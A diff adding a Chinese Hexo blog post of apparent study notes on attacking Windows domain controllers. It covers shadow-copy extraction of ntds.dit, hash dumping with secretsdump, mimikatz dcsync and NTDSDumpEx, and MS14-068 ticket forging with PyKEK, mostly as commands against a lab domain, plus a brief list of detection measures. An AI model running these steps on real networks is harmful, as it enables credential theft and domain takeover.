@@ -1,0 +1,1225 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网,笔记,域控安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="域控安全在一般情况下，拥有管理员权限也无法读取DC中的C:\Windows|NTDS\ntds.dit文件。(AD始终访问这个文件，所以文件禁止读取)。但是使用Windows本地卷影拷贝可以获得文件副本。将会介绍:  常用读取ntds.dit文件方法 MS14-068">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全攻防笔记6">
+<meta property="og:url" content="http://example.com/2022/05/29/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B06/index.html">
+<meta property="og:site_name" content="Recoder">
+<meta property="og:description" content="域控安全在一般情况下，拥有管理员权限也无法读取DC中的C:\Windows|NTDS\ntds.dit文件。(AD始终访问这个文件，所以文件禁止读取)。但是使用Windows本地卷影拷贝可以获得文件副本。将会介绍:  常用读取ntds.dit文件方法 MS14-068">
+<meta property="og:locale">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529183706.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529184018.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529184121.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529184455.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529184635.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220531173000.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220531173858.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220531193937.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220531201854.png">
+<meta property="article:published_time" content="2022-05-29T10:20:37.000Z">
+<meta property="article:modified_time" content="2022-05-29T10:20:37.000Z">
+<meta property="article:author" content="Laplace">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="域控安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529183706.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/05/29/内网安全攻防笔记6/"/>
+
+
+
+
+
+  <title>内网安全攻防笔记6 | Recoder</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Recoder</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/29/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B06/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Laplace">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Recoder">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网安全攻防笔记6</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-05-29T18:20:37+08:00">
+                2022-05-29
+              </time>
+            
+
+			
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">内网安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="域控安全"><a href="#域控安全" class="headerlink" title="域控安全"></a>域控安全</h1><p>在一般情况下，拥有管理员权限也无法读取DC中的<code>C:\Windows|NTDS\ntds.dit</code>文件。(AD始终访问这个文件，所以文件禁止读取)。但是使用Windows本地卷影拷贝可以获得文件副本。<br>将会介绍:</p>
+<ul>
+<li>常用读取ntds.dit文件方法</li>
+<li>MS14-068</li>
+</ul>
+<span id="more"></span>
+
+
+<h2 id="卷影拷贝ntds-dit"><a href="#卷影拷贝ntds-dit" class="headerlink" title="卷影拷贝ntds.dit"></a>卷影拷贝ntds.dit</h2><p>AD中所有数据保存在ntds.dit文件中。ntds.dit是一个二进制文件位于<code>%SystemRoot%\ntds\ntds.dit</code>。<br>ntds.dit包括但是不限于用户名， 散列值， 组, GPP, OU的相关信息。与SAM文件相同被系统锁定</p>
+<h3 id="通过ntdsutil-exe提取ntds-dit"><a href="#通过ntdsutil-exe提取ntds-dit" class="headerlink" title="通过ntdsutil.exe提取ntds.dit"></a>通过ntdsutil.exe提取ntds.dit</h3><p>ntdsutil.exe支持 Win2003 , Win 2008 , Win 2012<br>在DC中输入以下命令，创建一个快照。该快照包含Windows所有文件，且可以复制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit </span><br></pre></td></tr></table></figure>
+<p>可见成功创建快照GUID为{f4456290-df1e-4213-bd9a-b6155ef066be}<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529183706.png"></p>
+<p>接着加载刚刚创建的快照</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;f4456290-df1e-4213-bd9a-b6155ef066be&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529184018.png"><br>快照被加载到<code>C:\$SNAP_202205291836_VOLUMEC$</code>中<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529184121.png"></p>
+<p>将快照中的文件复制出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202205291836_VOLUMEC$\windows\ntds\ntds.dit c:\</span><br><span class="line">![](https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529184408.png)</span><br></pre></td></tr></table></figure>
+
+<p>输入命令将之前的快照删除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;f4456290-df1e-4213-bd9a-b6155ef066be&#125;&quot; &quot;delete &#123;f4456290-df1e-4213-bd9a-b6155ef066be&#125;&quot; quit quit </span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529184455.png"></p>
+<p>再次查询系统快照，如果显示没有任何快照表示 删除成功。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220529184635.png"></p>
+<h3 id="利用vssadmin提取ntds-dit"><a href="#利用vssadmin提取ntds-dit" class="headerlink" title="利用vssadmin提取ntds.dit"></a>利用vssadmin提取ntds.dit</h3><p>vssadmin是win 2008 和 win 7 提供的VSS管理工具。可以用于卷影的管理<br>vssadmin流程与ntdsutil类似</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c:   // 创建C盘卷影</span><br><span class="line">//复制文件</span><br><span class="line">copy  \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit </span><br><span class="line">vssadmin delete shadows /<span class="keyword">for</span>=c: /quiet  //删除快照</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用vssown-vbs脚本提取ntds-dit"><a href="#利用vssown-vbs脚本提取ntds-dit" class="headerlink" title="利用vssown.vbs脚本提取ntds.dit"></a>利用vssown.vbs脚本提取ntds.dit</h3><p>vssown.vbs脚本功能和vssadmin类似。可以对于卷影进行管理</p>
+<p>脚本常用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//启动卷影拷贝服务</span><br><span class="line">cscript vssown.vbs /start</span><br><span class="line">//创建C盘卷影拷贝</span><br><span class="line">cscript vssown.vbs /create c</span><br><span class="line">//列出当前卷影</span><br><span class="line">cscript vssown.vbs /list</span><br><span class="line">//删除卷影</span><br><span class="line">cscript vssown.vbs /delete </span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start</span><br><span class="line">cscript vssown.vbs /create c</span><br><span class="line">cscript vssown.vbs /list</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\ntds\ntds.dit c:\123.txt</span><br><span class="line">cscript vssown.vbs /delete  &#123;4047C43E-064F-46A9-B9D2-04571828B5C2&#125;  //&#123;ID&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用IFM创建卷影拷贝"><a href="#使用IFM创建卷影拷贝" class="headerlink" title="使用IFM创建卷影拷贝"></a>使用IFM创建卷影拷贝</h3><p>可以使用创建IFM方式获取ntds.dit。这些操作可以通过PowerShell或则 WMI远程执行<br>在DC上以管理员打开CMD</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure>
+<p>使用命令后 ntds.dit在 <code>C:\test\Active Directory\中</code><br>SYSTEM 和 SECURITY 在 <code>C:\test\registry\</code>中 </p>
+<p>获得 ntds.dit 文件后删除 test文件夹<br><code>rmdir /s/q test</code></p>
+<h3 id="使用diskshadow导出-ntds-dit"><a href="#使用diskshadow导出-ntds-dit" class="headerlink" title="使用diskshadow导出 ntds.dit"></a>使用diskshadow导出 ntds.dit</h3><p>diskshadow拥有交互模式和非交互模式。无论是交互模式还是非交互模式，都可以使用exec调取脚本执行命令。<br>diskshadow可以导出ntds.dit<br>写入如下文本文件 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// 设置卷影拷贝</span><br><span class="line">set context persistent nowriters</span><br><span class="line">//添加卷</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">//创建快照</span><br><span class="line">create</span><br><span class="line">//分配虚拟磁盘</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">//复制ntds.dit</span><br><span class="line">exec &quot;cmd.exe&quot; /c copy k:\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line">//删除所有快照</span><br><span class="line">delete shadows all</span><br><span class="line">//列出系统中的卷影拷贝</span><br><span class="line">list shadows all</span><br><span class="line">//重置</span><br><span class="line">reset</span><br><span class="line">//退出</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+<p>使用时需要删除所有的 注释<br>使用diskshadow.exe加载文件<br><code>diskshadow /s c:\empty.txt</code></p>
+<p>在使用 diskshadow.exe进行 导出 ntds.dit 的操作时需要将当前SHELL的路径切换至 <code>c:windows\system32</code>不然会发生错误<br>导出ntds.dit后需要将system.hive存储，因为system.hive存放ntds.dit的密钥。如果没有该密钥无法查看ntds.dit 中的信息。<br><code>reg save hklm\system c:\system.hive</code></p>
+<p>在使用diskshadow的过程中需要注意:</p>
+<ul>
+<li>可以在非特权用户权限使用 diskshadow.exe部分功能，更加的灵活</li>
+<li>使用diskshadow需要将命令文件上传至目标服务器，或者通过交互模式完成。vshadow等工具可以直接执行命令</li>
+<li>需要先将含有执行命令的txt文件写入目标机器，在使用diskshadow调用</li>
+<li>可以通过WMI完成操作</li>
+<li>使用diskshadown必须在 <code>c:\windows\system32</code>目录中</li>
+<li>脚本执行后，需要检查复制的ntds.dit文件大小，如果大小发生变化需要重新执行。</li>
+</ul>
+<h3 id="监控卷影拷贝服务的使用情况"><a href="#监控卷影拷贝服务的使用情况" class="headerlink" title="监控卷影拷贝服务的使用情况"></a>监控卷影拷贝服务的使用情况</h3><p>通过监控卷影拷贝服务的使用情况,可以及时发现攻击者在系统中的恶意操作</p>
+<ul>
+<li>监控卷影拷贝服务和任何涉及ntds.dit的可以行为</li>
+<li>监控System Event ID 7036 (卷影拷贝服务进入运行的标志) 的可以实例，以及创建vssvc.exe进程的事件</li>
+<li>监控创建diskshadow.exe及相关子进程的事件</li>
+<li>除非业务需要，在Windows中不应该出现 diskshadow.exe如果发现，应该及时删除</li>
+<li>通过日志监控发现新的逻辑驱动器映射事件</li>
+</ul>
+<h2 id="导出ntds-dit中的散列值"><a href="#导出ntds-dit中的散列值" class="headerlink" title="导出ntds.dit中的散列值"></a>导出ntds.dit中的散列值</h2><h3 id="esedbexport-恢复ntds-dit信息"><a href="#esedbexport-恢复ntds-dit信息" class="headerlink" title="esedbexport 恢复ntds.dit信息"></a>esedbexport 恢复ntds.dit信息</h3><ol>
+<li>导出 ntds.dit</li>
+</ol>
+<p>下载libesedb<br><a target="_blank" rel="noopener" href="https://github.com/libyal/libesedb/releases">https://github.com/libyal/libesedb/releases</a></p>
+<p>安装环境依赖<br><code>apt-get install autoconf automake autopoint libtool pkg-config</code></p>
+<p>输入命令完成libesedb编译和安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
+
+<p>完成安装后在/usr/local/bin目录下看到 esedbexport程序<br><code>esedbexport -m tables ntds.dit</code></p>
+<p>生成ntds.dit.export文件夹，我们现在只需要 datatable 和 link_table</p>
+<ol start="2">
+<li>导出散列值</li>
+</ol>
+<p>下载 ntdxtract<br><a target="_blank" rel="noopener" href="https://github.com/csababarta/ntdsxtract.git">https://github.com/csababarta/ntdsxtract.git</a></p>
+<p>安装 ntdsxtract</p>
+<p><code>python setup.py build &amp;&amp; python setup.py install </code></p>
+<p>将域内用户和散列值导出到All_user.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all_user.txt</span><br></pre></td></tr></table></figure>
+
+<p>ntds.dit包含域内所有信息，可以通过分析ntds.dit导出域内的计算机信息和其他信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dscomputers.py ntds.dit.export/datatable.4 computer_output --csvoutfile all_computers.csv</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用impacket导出散列值"><a href="#使用impacket导出散列值" class="headerlink" title="使用impacket导出散列值"></a>使用impacket导出散列值</h3><p>使用impacket工具包中的secretsdump,也可以导出散列值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -system system.hive -ntds ntds.dit local</span><br></pre></td></tr></table></figure>
+
+<p>impacket 还可以通过用户名和散列值验证，从远程DC中读取ntds.dit并存储.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942 -just-dc hacke.testlab/administrator@10.1.1.1 </span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows中解析ntds-dit"><a href="#Windows中解析ntds-dit" class="headerlink" title="Windows中解析ntds.dit"></a>Windows中解析ntds.dit</h3><p>使用NTDSDunmpx.exe可以进行散列值导出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -s system.hive</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220531173000.png"></p>
+<h2 id="使用dcsync获得散列值"><a href="#使用dcsync获得散列值" class="headerlink" title="使用dcsync获得散列值"></a>使用dcsync获得散列值</h2><h3 id="使用mimikatz获得散列值"><a href="#使用mimikatz获得散列值" class="headerlink" title="使用mimikatz获得散列值"></a>使用mimikatz获得散列值</h3><p>mimikztz在<strong>管理员</strong>权限下，拥有dcsync功能，可以利用卷影直接读取ntds.dit文件并获得散列值。</p>
+<p>在域内任意一台机器，使用管理员打开mimikatz。导出所有用户散列值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:hacke.testlab /all /csv</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220531173858.png"></p>
+<p>也可以导出指导用户散列值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:hacke.testlab /all /user:administrator</span><br></pre></td></tr></table></figure>
+
+<p>也可以直接在DC中运行mimikatz，通过转储lsass.exe对散列值Dump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /inject </span><br></pre></td></tr></table></figure>
+
+<h3 id="使用dcsync获得域帐号和散列值"><a href="#使用dcsync获得域帐号和散列值" class="headerlink" title="使用dcsync获得域帐号和散列值"></a>使用dcsync获得域帐号和散列值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220531193937.png"></p>
+<h2 id="使用Metasploit获得散列值"><a href="#使用Metasploit获得散列值" class="headerlink" title="使用Metasploit获得散列值"></a>使用Metasploit获得散列值</h2><p>psexec_ntdsgrab模块</p>
+<p>使用domain_hashdump模块</p>
+<p>如果已经获得了目标session可以使用domain_hashdump模块，获得域帐号和散列值。</p>
+<h2 id="使用vshadown-exe-和QuarksPwDump-exe导出Hash"><a href="#使用vshadown-exe-和QuarksPwDump-exe导出Hash" class="headerlink" title="使用vshadown.exe 和QuarksPwDump.exe导出Hash"></a>使用vshadown.exe 和QuarksPwDump.exe导出Hash</h2><p>在正常域环境中ntds.dit文件包含较大信息，体积比较大，不方便保存在本地。如果DC上没有安装杀毒软件可以在本地读取对应的Hash和帐号。</p>
+<p>获得散列值后可以使用本地破解工具进行破解如:</p>
+<ul>
+<li>Cain</li>
+<li>LC7</li>
+<li>Ophcrack</li>
+<li>SAMInside</li>
+<li>Hashcat</li>
+</ul>
+<h2 id="Kerberos域用户提权"><a href="#Kerberos域用户提权" class="headerlink" title="Kerberos域用户提权"></a>Kerberos域用户提权</h2><p>MS14-068;CVE-2014-6324;KB3011780.<br>所有服务器都会受到该漏洞影响有:Win 2003 ,Win 2008 , Win 2008R2, Win 2012 和Win 2012 R2.该漏洞允许攻击者使用域内任意一个用户，将权限提升至域管理。<br>也就是如果攻击者获得了域内任意一台计算机的Shell.同时知道任意域用户用户名\、SID、密码。既可以获得域管理员权限。进而控制DC，最终获得域权限</p>
+<p>漏洞产生的原因:用户向KDC申请TGT时，可以伪造自己的Kerberos票据。声明自己具有域管理员权限。KDC在处理票据的时候没有验证签名，返回给用户的TGT使得普通域用户具有域管理权限。用户将TGT发送给KDC,KDC的TGS验证TGT后，将服务票据发给用户。使得用户具有访问服务的权限。</p>
+<h3 id="PyKEK工具包"><a href="#PyKEK工具包" class="headerlink" title="PyKEK工具包"></a>PyKEK工具包</h3><p>PyKEK是一个利用KERberos协议进行渗透测试的工具包。使用PyKEK可以生成高权限服务票据，通过mimikatz将票据注入内存。</p>
+<p>PyKEK需要Python2.7环境。使用PyKEK可以将Python文件转为exe文件。</p>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>查看用户SID</p>
+<p>输入命令<code>whoami /user</code>可以查看用户SID<br>输入命令<code>wmic useraccount get name , sind</code>获得所有用户SID.<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220531201854.png"></p>
+<p>使用PyKEK生成高权限票据<br><code>python ms14-068.py -u administrator@hacke.testlab -s  S-1-5-21-2922091672-2198656461-2394181596-500 -d 10.1.1.1 -p 1234 .com </code><br>在当前目录下生成 <a href="mailto:&#x54;&#x47;&#x54;&#95;&#x75;&#x73;&#x65;&#49;&#64;&#x68;&#x61;&#x63;&#107;&#101;&#x2e;&#116;&#x65;&#115;&#116;&#x6c;&#97;&#x62;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#101;">&#x54;&#x47;&#x54;&#95;&#x75;&#x73;&#x65;&#49;&#64;&#x68;&#x61;&#x63;&#107;&#101;&#x2e;&#116;&#x65;&#115;&#116;&#x6c;&#97;&#x62;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#101;</a>的票据文件</p>
+<p>将票据文件复制道win2008的mimikatz的目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptc &quot;TGT_user1@hacke.testlab.ccache&quot;</span><br></pre></td></tr></table></figure>
+<p>显示  “Injecting ticket: OK”</p>
+<p>表示注入成功</p>
+<h3 id="goldenPac-py"><a href="#goldenPac-py" class="headerlink" title="goldenPac.py"></a>goldenPac.py</h3><p>goldenPac.py是一个集成在impacket工具包中</p>
+<p>goldenPac.py通过PsExec获得Shell，会产生大量的日志，同时PsExec被很多厂商列入危险文件，很容易被发现</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
+          
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+          
+            <a href="/tags/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8/" rel="tag"># 域控安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/05/17/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B05/" rel="next" title="内网安全攻防笔记5">
+                <i class="fa fa-chevron-left"></i> 内网安全攻防笔记5
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
